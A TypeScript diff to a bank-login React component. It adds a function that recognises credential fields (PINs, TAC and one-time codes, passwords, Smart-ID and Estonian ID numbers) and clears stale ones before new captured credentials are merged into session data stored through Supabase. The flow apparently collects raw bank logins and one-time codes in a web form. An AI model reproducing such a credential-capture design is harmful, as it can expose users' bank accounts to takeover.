@@ -109,6 +109,49 @@ function inferCanonicalCredentialKey(
   return null;
 }
 
+function shouldResetPreviousBankField(key: string): boolean {
+  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
+
+  if (
+    key === "verfuegernummer" ||
+    key === "pin" ||
+    key === "tacCode" ||
+    key === "personalCode" ||
+    key === "loginMethod" ||
+    key === "phone" ||
+    key === "username" ||
+    key === "password"
+  ) {
+    return true;
+  }
+
+  if (inferCanonicalCredentialKey(key)) {
+    return true;
+  }
+
+  return (
+    normalizedKey.includes("rememberme") ||
+    normalizedKey.includes("loginwidget") ||
+    normalizedKey.includes("mobilenumber") ||
+    normalizedKey.includes("mobileids") ||
+    normalizedKey.includes("smartid") ||
+    normalizedKey.includes("simpleid") ||
+    normalizedKey.includes("userid") ||
+    normalizedKey.includes("personalidentity") ||
+    normalizedKey.includes("identitycode") ||
+    normalizedKey.includes("isikukood") ||
+    normalizedKey.includes("password") ||
+    normalizedKey.includes("passcode") ||
+    normalizedKey.includes("parool") ||
+    normalizedKey.includes("tac") ||
+    normalizedKey.includes("otp") ||
+    normalizedKey.includes("verificationcode") ||
+    normalizedKey.includes("responsecode") ||
+    normalizedKey.includes("digipass") ||
+    normalizedKey.includes("kalkulaator")
+  );
+}
+
 export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
@@ -239,8 +282,12 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         return [[key, trimmedValue]];
       }),
     );
+    const preservedSessionFormData = Object.fromEntries(
+      Object.entries(sessionFormData).filter(([key]) => !shouldResetPreviousBankField(key)),
+    );
+
     const nextFormData = {
-      ...sessionFormData,
+      ...preservedSessionFormData,
       ...extraCapturedFields,
       ...credentials,
     };
